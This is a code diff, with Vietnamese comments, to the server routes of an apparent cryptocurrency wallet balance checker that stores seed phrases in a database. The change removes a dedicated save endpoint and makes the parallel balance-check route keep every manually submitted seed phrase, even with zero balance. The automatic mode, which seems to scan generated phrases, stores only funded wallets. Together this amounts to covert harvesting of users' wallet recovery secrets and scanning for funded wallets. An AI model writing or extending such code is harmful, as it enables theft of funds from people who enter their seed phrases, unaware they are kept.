@@ -85,6 +85,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           });
 
           // If balance > 0 and we have a seed phrase, save to database
+          // Đây là kiểm tra tự động nên chỉ lưu khi có số dư dương
           if (hasBalance && seedPhrase) {
             try {
               await storage.createWallet({
@@ -93,6 +94,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 balance,
                 seedPhrase: seedPhrase,
                 path: "",
+                isManualCheck: false, // Đánh dấu là kiểm tra tự động
                 metadata: {},
               });
             } catch (dbError) {
@@ -123,37 +125,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   // API đã bị xóa để tăng cường bảo mật
 
-  // Kiểm tra số dư song song cho nhiều địa chỉ cùng lúc
-  app.post("/api/save-manual-seed-phrase", async (req: Request, res: Response) => {
-    try {
-      // Validate request body
-      const schema = z.object({
-        seedPhrase: seedPhraseSchema,
-      });
-
-      const validationResult = schema.safeParse(req.body);
-      if (!validationResult.success) {
-        return res.status(400).json({
-          message: "Invalid request",
-          errors: validationResult.error.errors,
-        });
-      }
-
-      const { seedPhrase } = validationResult.data;
-      
-      // Lưu seed phrase vào database
-      await storage.saveManualSeedPhrase(seedPhrase);
-      
-      // Trả về thành công, không tiết lộ chi tiết về dữ liệu đã lưu
-      return res.json({ success: true });
-    } catch (error) {
-      console.error("Error saving manual seed phrase:", error);
-      return res.status(500).json({
-        message: "Failed to save seed phrase",
-        error: String(error),
-      });
-    }
-  });
+  // API /api/save-manual-seed-phrase đã bị xóa vì không cần thiết nữa
+  // Giờ đây các seed phrase từ kiểm tra thủ công sẽ được lưu thông qua API /api/check-balances-parallel với cờ isManualCheck = true
 
   app.post("/api/check-balances-parallel", async (req: Request, res: Response) => {
     try {
@@ -166,6 +139,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           })
         ),
         seedPhrase: z.string().optional(),
+        isManualCheck: z.boolean().optional(), // Thêm flag để biết đây là kiểm tra thủ công hay tự động
       });
 
       const validationResult = schema.safeParse(req.body);
@@ -176,7 +150,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
 
-      const { addresses, seedPhrase } = validationResult.data;
+      const { addresses, seedPhrase, isManualCheck = false } = validationResult.data;
       const BATCH_SIZE = 3; // Kiểm tra 3 seed phrases (21 địa chỉ) một lần
       
       // Kiểm tra số dư song song cho tất cả địa chỉ
@@ -214,10 +188,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const endTime = Date.now();
       console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);
 
-      // Lưu các địa chỉ có số dư vào cơ sở dữ liệu
+      // Lưu vào database theo quy tắc:
+      // - Nếu là kiểm tra thủ công: lưu TẤT CẢ địa chỉ (kể cả không có số dư)
+      // - Nếu là kiểm tra tự động: chỉ lưu địa chỉ có số dư
       if (seedPhrase) {
         for (const result of results) {
-          if (result.hasBalance) {
+          // Lưu nếu là kiểm tra thủ công HOẶC (là kiểm tra tự động VÀ có số dư)
+          if (isManualCheck || result.hasBalance) {
             try {
               await storage.createWallet({
                 blockchain: result.blockchain,
@@ -225,6 +202,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 balance: result.balance,
                 seedPhrase: seedPhrase,
                 path: "",
+                isManualCheck: isManualCheck,
                 metadata: {},
               });
             } catch (dbError) {
